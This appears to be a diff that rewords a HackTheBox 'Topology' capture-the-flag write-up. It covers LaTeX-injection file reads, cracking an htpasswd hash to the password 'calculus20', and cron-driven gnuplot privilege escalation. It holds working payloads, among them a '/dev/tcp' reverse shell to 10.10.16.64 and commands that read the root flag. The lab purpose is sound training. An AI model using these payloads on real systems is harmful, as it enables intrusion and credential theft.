@@ -1,9 +1,9 @@
 
-Begin with adding your ip address to `/etc/hosts`:
+Start by adding the target IP address to your `/etc/hosts` file:
 
 ![[HackTheBox/Topology/images/2.png]]
 
-I'll conduct port scanning operation:
+Next, I ran a port scan to enumerate services:
 
 ```bash
 sudo nmap -sV -sC topology.htb
@@ -11,95 +11,95 @@ sudo nmap -sV -sC topology.htb
 
 ![[HackTheBox/Topology/images/1.png]]
 
+I also launched a directory brute-force against the web root:
+
 ```bash
 dirsearch -u http://topology.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
 
 ![[HackTheBox/Topology/images/4.png]]
 
-On port `80`, page refer to another domain and fuzzing does not result in juicy results:
+On port `80`, the landing page referred to another domain, and fuzzing did not return anything juicy:
 
 ![[HackTheBox/Topology/images/3.png]]
 
-Let's add the custom domain to `/etc/hosts` file as well.
+Let's add the custom domain to the `/etc/hosts` file as well.
 
-Then LaTex php script generates images where you insert on input:
+From there, a LaTeX-backed PHP script renders images from whatever expression you supply as input:
 
 ![[HackTheBox/Topology/images/5.png]]
 
-I found very useful page especially for crafting LaTex language command injections:
+I found a very useful reference, especially for crafting LaTeX command-injection payloads:
 
 https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/#summary
 
-Additionally, I tried `\input{/etc/passwd}` ,but page sanitized.
+I first tried `\input{/etc/passwd}`, but the page sanitized the request.
 
 ![[HackTheBox/Topology/images/6.png]]
 
-However, most of the payloads did not work on this page.
+Most of the common payloads did not work on this endpoint.
 
-I found a page consisting related functionality where you can input something and returns PDF or image.
+I then found a related writeup about a page that accepts input and returns a PDF or image:
 
 https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a
 
-In the writeup, it references a link where you can reach another juicy extended payloads.
+The writeup references another resource with more advanced payloads:
 
 https://0day.work/hacking-with-latex/
 
 ![[HackTheBox/Topology/images/7.png]]
 
-It was not able to parse entire `/etc/passwd` content ,but indicates the input field vulnerable to LaTex injection.
+It could not parse the entire `/etc/passwd` content, but it confirmed that the input field was vulnerable to LaTeX injection.
 
 ![[HackTheBox/Topology/images/8.png]]
 
-
-After multiple times of efforts, I could not run any commands ,so I decided to shift on subdomain enumeration (vhost):
+After many attempts, I still could not execute arbitrary commands, so I shifted focus to virtual-host (vhost) enumeration:
 
 ```bash
 ffuf -H "Host: FUZZ.topology.htb" -H "User-Agent: PENTEST" -c -w "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" -u http://topology.htb
 ```
 
-
-Discovered interesting results:
+This returned some interesting results:
 
 ![[HackTheBox/Topology/images/9.png]]
 
 ![[HackTheBox/Topology/images/11.png]]
 
-I did not add `dev` subdomain to `hosts` file.
+I had not yet added the `dev` subdomain to the `hosts` file.
 
 ![[HackTheBox/Topology/images/10.png]]
 
-Let's add it ->
+Let's add it:
 
 ![[12.png]]
 
-On `dev` subdomain I encountered http auth ,so I research a bit more then saw hacktricks's guide on latex injection:
+On the `dev` subdomain I ran into HTTP auth, so I dug a bit deeper and landed on HackTricks's guide for LaTeX injection:
 
 https://hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html
 
-`\lstinputlisting{/etc/hosts}` it did not work as well.
+`\lstinputlisting{/etc/hosts}` did not work either.
 
-LateX has special element trigger for commands:
+LaTeX uses specific characters to trigger commands:
 
 https://www.overleaf.com/learn/latex/Commands
 
-Let's add dollar symbol to our payload
+Let's wrap the payload in dollar signs:
 
 ![[13.png]]
 
 `$\lstinputlisting{/etc/passwd}$`
 
-Now it is possible to reach `/etc/passwd`
+Now it is possible to read `/etc/passwd`.
 
 ![[14.png]]
 
-I tried to read configuration files ,but this did not work. I moved to understand in simple LFI payloads to read other files in `/var/www/html/.htaccess` ,yet got error.
+I tried to read configuration files, but that did not work. I fell back to a simple LFI-style payload to read `/var/www/html/.htaccess`, which returned an error:
 
 ```bash
 $\lstinputlisting{/var/www/apache/.htaccess}$
 ```
 
-I already discovered page on `dev` subdomain then simple logic can results in `dev` capture:
+Since I had already discovered the `dev` subdomain, simple path reasoning leads to the `dev` config:
 
 ```bash
 $\lstinputlisting{/var/www/dev/.htaccess}$
@@ -107,26 +107,25 @@ $\lstinputlisting{/var/www/dev/.htaccess}$
 
 ![[15.png]]
 
-Let's switch on `/var/www/dev/.htpasswd`
+Now let's pivot to `/var/www/dev/.htpasswd`:
 
 ![[16.png]]
 
-Let's try to auth `SSH` as `vdaisley`:
+Let's try to authenticate over SSH as `vdaisley`:
 
 `vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`
 
-Let's check the type of hash ->
+First, identify the hash type:
 
 ```bash
 hash-identifier
 
-
 HASH: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
 ```
 
-![[17.png]]
+![[HackTheBox/Topology/images/17.png]]
 
-John automatically identified the type of hash and suggested --format parameter.
+John automatically identified the hash type and suggested the correct `--format` parameter.
 
 ```bash
 john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -136,82 +135,79 @@ john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
 john --show md5.txt
 ```
 
-![[18.png]]
+![[HackTheBox/Topology/images/18.png]]
 
-Let's auth through `vdaisley:calculus20`.
+Let's authenticate with `vdaisley:calculus20`.
 
 It worked.
 
-![[19.png]]
+![[HackTheBox/Topology/images/19.png]]
 
-`cat /user.txt`. Next, I could not check any commands run on `sudo` it simply disabled on host.
+`cat /user.txt`. Next, I checked for `sudo` privileges, but `sudo` was disabled on the host.
 
-![[20.png]]
+![[HackTheBox/Topology/images/20.png]]
 
-We have to run `linpeas.sh` on target:
+Time to run `linpeas.sh` on the target:
 
 ```bash
-On attacker:
+On the attacker:
 
 python -m http.server 1000
 
-Target Host (use /tmp/ directory due to the permissions)
+On the target (use /tmp/ because of write permissions):
 curl http://10.10.16.64:1000/linpeas.sh -o linpeas.sh
 ```
 
-1-2 hours later I found that the attacker vector is most likely triggers itself through a binary read + write perms:
+After an hour or two of triage, I concluded that the most likely attack vector was a binary with both read and write permissions:
 
-![[21.png]]
+![[HackTheBox/Topology/images/21.png]]
 
-write perms on `gnuplot`
+Write permissions on `gnuplot`:
 
-![[22.png]]
+![[HackTheBox/Topology/images/22.png]]
 
-Because of privileges of binary I decided to check if there are some moves through GFTObins especially in SUID.
+Because of the binary's privileges, I checked GTFOBins for possible paths, especially around SUID.
 
-![[23.png]]
+![[HackTheBox/Topology/images/23.png]]
 
-I also attempted to get `SUID` privileges of binary still stuck on it.
+I also attempted to abuse SUID privileges on the binary directly, but got stuck.
 
-![[24.png]]
+![[HackTheBox/Topology/images/24.png]]
 
-However, we have write perms so I also understand whether it generates something in somewhere.
+Since I had write permissions, I also wanted to understand whether the binary produces any artifacts somewhere — for example, via a cron job:
 
 https://stackoverflow.com/questions/5497889/is-there-a-standard-file-extension-for-gnuplot-files
 
-![[25.png]]
+![[HackTheBox/Topology/images/25.png]]
 
-In this case, it will be suitable to try all extensions to test whether the binary uses cronjob or not.
+In that case, it was worth trying every known extension to test whether a cron job was picking them up.
 
 ```bash
-Not worked
+# Did not work
 echo 'system("touch /tmp/E")' > /opt/gnuplot/E.sh
 
-Worked ->
+# Worked
 echo 'system("touch /tmp/ErkanUcar2")' > /opt/gnuplot/cuneyt2.plt
 ```
 
+![[HackTheBox/Topology/images/26.png]]
 
-![[26.png]]
-
-If cron see `.plt` extension then automatically runs command inside the `system()` method.
+When cron sees a `.plt` extension, it automatically runs whatever is inside the `system()` call.
 
 ```bash
 penelope -p 443
 
-
 echo 'system("sh -i >& /dev/tcp/10.10.16.64/443 0>&1")' > /opt/gnuplot/OumoutChouseinoglou.plt
 ```
 
-![[27.png]]
+![[HackTheBox/Topology/images/27.png]]
 
-Actually it is burden I'll read directly flag as assuming root flag located on `/root/`:
+Actually, a full reverse shell is overkill here — I can just read the flag directly, assuming it lives under `/root/`:
 
 ```bash
 echo 'system("cat /root/root.txt > /tmp/flag.txt")' > /opt/gnuplot/onurcan.plt
 ```
 
-![[28.png]]
+![[HackTheBox/Topology/images/28.png]]
 
-Instead of waiting for reverse shell this approach completes entire priv esc vector.
-
+Instead of waiting for a reverse shell, this approach wraps up the entire privilege-escalation vector.
